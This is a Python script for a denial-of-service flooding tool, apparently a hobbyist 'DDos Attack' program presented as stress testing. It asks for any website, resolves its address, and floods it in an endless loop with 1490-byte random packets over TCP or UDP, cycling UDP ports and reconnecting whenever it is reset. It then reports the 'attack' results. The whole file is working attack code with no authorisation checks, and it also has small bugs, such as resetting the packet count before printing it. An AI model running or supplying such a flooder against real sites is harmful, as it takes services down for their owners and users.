import sys
import os
import time
import socket
import random,threading
#Code Time
from datetime import datetime

from dateutil.rrule import weekday
max1 = 0
reqtmp = 0
sent = 0
def printreqcount():
    global reqtmp,max1
    if(sent-reqtmp > 0):
	    print(time.ctime()+' Requests are: '+str(sent-reqtmp))
	    max1 = max(max1,sent-reqtmp)
	#else if(reqcount-reqtmp<0)
	#	time.sleep()
    reqtmp = sent
    threading.Timer(1, printreqcount).start()

def dosmain():
     now = datetime.now()
     hour = now.hour
     minute = now.minute
     day = now.day
     month = now.month
     year = now.year

     ##############

     bytes = random._urandom(1490)
     #############

     os.system("clear")
     #os.system("figlet DDos Attack")
     try:
          website = input("Website Target : ")
          ip = socket.gethostbyname(website)
     except socket.gaierror:
          print('Invalid Website url/Error resolving IP Address!!')
          input('Press Enter to Try Again: ')
          dosmain()

     port = 80

     try:
          useprotocol = int(input('Using TCP- press 1 or Using UDP- press 2:'))
          if useprotocol == 1:
               useprotocol = "TCP"
               usedprotocol = socket.SOCK_STREAM
          elif useprotocol == 2:
               useprotocol = "UDP"
               usedprotocol = socket.SOCK_DGRAM
          else:
               dosmain()
          # TCP uses SOCK_STREAM and UDP uses SOCK_DGRAM

          sock = socket.socket(socket.AF_INET, usedprotocol)

     except socket.error as err:
          print("socket creation failed with error %s" % (err))
          input('Try Again! Press Enter to Retry: ')
          dosmain()

     os.system("clear")
     sent = 0
     t0 = time.time()
     sock.connect((ip, port))
     print("Stress testing started!!")
     while True:
          try:
               sock.sendto(bytes, (ip, port))
               sent = sent + 1
               if(usedprotocol != socket.SOCK_STREAM):
                    port = port + 1
               #print("Sent %s packet to %s through port:%s" % (sent, website, port))
               # printreqcount()
               if(sent == 1000):
                    print('\nPress CTRL + C to See Results!!')
               if port == 65534:
                    port = 1
          except KeyboardInterrupt:
               sent = 0
               t1 = time.time()
               print('\nAll done....\nAttack done on: {}\nTotal runnning time:{}\nTotal Packets Sent:{}\nPackets sent per second is: {}'.format(website,(t1-t0),sent,int(sent/(t1-t0))))
               print('Protocol used is: '+useprotocol)
               # If you actually want the program to exit
               sys.exit()
          except ConnectionResetError:
               sock.close()
               # time.sleep(0.001)
               sock = socket.socket(socket.AF_INET, usedprotocol)
               sock.connect((ip, port))

if __name__ == "__main__":
     dosmain()
